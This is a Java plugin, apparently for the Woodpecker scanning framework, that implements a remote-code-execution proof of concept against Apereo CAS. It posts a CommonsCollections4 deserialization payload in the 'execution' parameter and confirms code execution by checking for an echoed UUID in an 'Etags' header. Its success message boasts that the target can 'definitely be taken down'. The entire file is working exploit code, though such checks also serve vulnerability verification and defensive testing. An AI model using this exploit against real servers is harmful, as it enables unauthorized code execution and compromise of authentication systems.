package me.gv7.woodpecker.plugin.pocs;

import me.gv7.woodpecker.plugin.*;
import net.dongliu.requests.Requests;

import java.util.*;

public class CasPoc implements IPoc {

    @Override
    public IScanResult doVerify(ITarget target, IResultOutput iResultOutput) {
        final IScanResult scanResult = CasRCE.pluginHelper.createScanResult();

        String httpAddress = CasCommonUtils.checkUrl(target.getAddress());
        try {
            if(CasCommonUtils.basicCheckVuln(httpAddress)){
                String payload = CasCommonUtils.generate("CommonsCollections4", "ThreadTest");
                Map<String,String> requestBody = new HashMap<>();
                requestBody.put("execution", payload);

                Map<String,String> requestHeaders = new HashMap<>();
                String key = UUID.randomUUID().toString();
                requestBody.put("Etags", key);
                String etags = Requests.post(httpAddress).body(requestBody).verify(false).headers(requestHeaders).send().getHeader("Etags");
                if (etags.equals(key)){
                    scanResult.setExists(true);
                    scanResult.setMsg("发现目标: "+httpAddress+" 肯定能打死\n");
                }
            }
        }catch (Exception ignore){
        }
        return scanResult;
    }
}
